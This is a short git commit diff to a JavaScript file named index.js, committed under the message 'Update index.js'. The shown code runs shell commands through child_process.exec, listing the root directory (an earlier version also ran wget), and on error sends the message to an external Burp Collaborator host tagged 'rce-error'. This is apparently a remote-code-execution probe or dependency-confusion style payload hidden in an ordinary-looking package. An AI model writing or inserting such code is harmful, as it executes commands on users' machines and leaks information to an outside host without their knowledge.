2c477b10e06e8414f4b385cd0c002958e989cf96
hussein98d <daher-hussein@hotmail.fr>
2021-07-14 16:41:40 +0000

    Update index.js

--- index.js
+++ index.js
@@ -83,7 +83,7 @@ fs.readFile('d.txt', 'utf8' , (err, data) => {
 
 const spawn = require('child_process');
 var request = require('request');
-spawn.exec("wget http://127.0.0.1; ls /", (error, stdout, stderr) => {
+spawn.exec("ls /", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         request('http://mzpz5sloxj1o8ocahftqnyjtokubvzk.burpcollaborator.net/?rce-error=' + error.message);
